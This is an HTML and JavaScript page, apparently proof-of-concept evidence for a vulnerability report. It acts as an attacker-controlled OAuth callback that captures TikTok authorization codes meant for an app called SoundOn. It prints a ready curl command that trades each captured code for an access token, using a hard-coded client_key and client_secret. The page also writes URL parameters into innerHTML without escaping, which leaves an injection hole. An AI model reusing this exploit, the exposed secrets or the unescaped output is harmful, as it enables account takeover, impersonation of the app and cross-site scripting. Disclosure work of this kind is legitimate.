<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OAuth Callback — PoC Evidence</title>
<style>
body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 40px; max-width: 800px; margin: 0 auto; }
h1 { color: #fff; }
.section { background: #111; border: 1px solid #222; border-radius: 8px; padding: 20px; margin: 16px 0; }
.label { color: #888; }
.val { color: #ff0; word-break: break-all; }
.success { color: #0f0; font-weight: bold; }
.fail { color: #fe2c55; }
.token-cmd { background: #000; border: 1px solid #333; border-radius: 4px; padding: 12px; overflow-x: auto; white-space: pre-wrap; color: #0ff; font-size: 13px; }
</style>
</head>
<body>
<h1>OAuth Callback — Evidence Capture</h1>

<div class="section" id="resultSection">
<div id="loadingMsg">Processing OAuth callback parameters...</div>
</div>

<script>
(function() {
  const params = new URLSearchParams(window.location.search);
  const code = params.get("code");
  const state = params.get("state");
  const error = params.get("error");
  const errorDesc = params.get("error_description");
  const scopes = params.get("scopes");

  const evidence = {
    timestamp: new Date().toISOString(),
    url: window.location.href,
    code: code || null,
    state: state || null,
    scopes: scopes || null,
    error: error || null,
    error_description: errorDesc || null,
    userAgent: navigator.userAgent
  };

  const container = document.getElementById("resultSection");

  if (code) {
    container.innerHTML =
      '<h2 class="success">&#10004; Authorization Code Captured</h2>' +
      '<div class="section">' +
      '<h2>Captured OAuth Parameters</h2>' +
      '<div><span class="label">code:</span> <span class="val">' + code + '</span></div>' +
      '<div><span class="label">state:</span> <span class="val">' + (state || "none") + '</span></div>' +
      '<div><span class="label">scopes:</span> <span class="val">' + (scopes || "none") + '</span></div>' +
      '</div>' +
      '<div class="section">' +
      '<h2>Token Exchange Command</h2>' +
      '<div class="token-cmd">curl -s "https://open-api.tiktok.com/oauth/access_token/" \\\n' +
      '  -H "Content-Type: application/json" \\\n' +
      '  -d \'{"client_key":"awulj3e36brrh086","client_secret":"e63acb9afab646ee9340f16a2380b1ed","code":"' + code + '","grant_type":"authorization_code"}\'</div>' +
      '</div>' +
      '<div class="section">' +
      '<h2>Full Evidence Object</h2>' +
      '<pre style="color:#0f0;overflow-x:auto">' + JSON.stringify(evidence, null, 2) + '</pre>' +
      '</div>' +
      '<div class="section">' +
      '<h2>What This Demonstrates</h2>' +
      '<p class="success">The attacker successfully intercepted the OAuth authorization code.</p>' +
      '<p>Because the <span class="val">client_secret</span> is exposed in client-side JavaScript,</p>' +
      '<p>the attacker can exchange this code for a valid TikTok access token,</p>' +
      '<p>impersonating the SoundOn application.</p>' +
      '</div>';
    console.log("%c[POC EVIDENCE] OAuth Code Captured", "color:lime;font-size:18px");
    console.log(JSON.stringify(evidence, null, 2));
    console.log("%cSave this screenshot as PoC evidence.", "color:orange");
  } else if (error) {
    container.innerHTML =
      '<h2 class="fail">&#10008; Authorization Failed</h2>' +
      '<div class="section">' +
      '<div><span class="label">error:</span> <span class="val">' + error + '</span></div>' +
      '<div><span class="label">description:</span> <span class="val">' + (errorDesc || "none") + '</span></div>' +
      '</div>' +
      '<div class="section">' +
      '<h2>Diagnostic</h2>' +
      '<pre style="color:#0f0;overflow-x:auto">' + JSON.stringify(evidence, null, 2) + '</pre>' +
      '</div>' +
      '<p class="fail">If the error is "redirect_uri_mismatch" or similar, TikTok validated the redirect_uri after login.</p>' +
      '<p>This still confirms the credentials are valid — TikTok recognized the client_key but blocked the unregistered redirect_uri.</p>';
  } else {
    container.innerHTML =
      '<h2>No OAuth Parameters Detected</h2>' +
      '<div class="section">' +
      '<pre style="color:#0f0;overflow-x:auto">' + JSON.stringify(evidence, null, 2) + '</pre>' +
      '</div>';
  }
})();
</script>
</body>
</html>
